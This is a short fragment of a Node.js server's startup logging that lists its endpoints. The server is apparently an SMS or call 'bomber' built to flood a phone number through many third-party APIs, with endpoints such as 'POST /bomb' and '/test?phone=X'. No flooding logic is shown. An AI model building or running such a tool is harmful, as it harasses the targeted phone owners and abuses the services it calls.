app.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════════════');
    console.log(`🚀 API Server on port ${PORT}`);
    console.log(`📊 Total: ${uniqueApis.length} | Normal: ${NORMAL_APIS.length} | RL: ${RATE_LIMIT_APIS.length}`);
    console.log(`⏱️ Max duration: ${MAX_DURATION_MIN} min`);
    console.log('═══════════════════════════════════════════');
    console.log('Endpoints:');
    console.log('  GET  /              Status');
    console.log('  GET  /health        Health');
    console.log('  GET  /test?phone=X  Test all');
    console.log('  GET  /stats         Working/RL/Rejected/Failed');
    console.log('  GET  /logs          Recent logs');
    console.log('  GET  /apis          List');
    console.log('  POST /bomb          Bombing');
    console.log('═══════════════════════════════════════════');
});
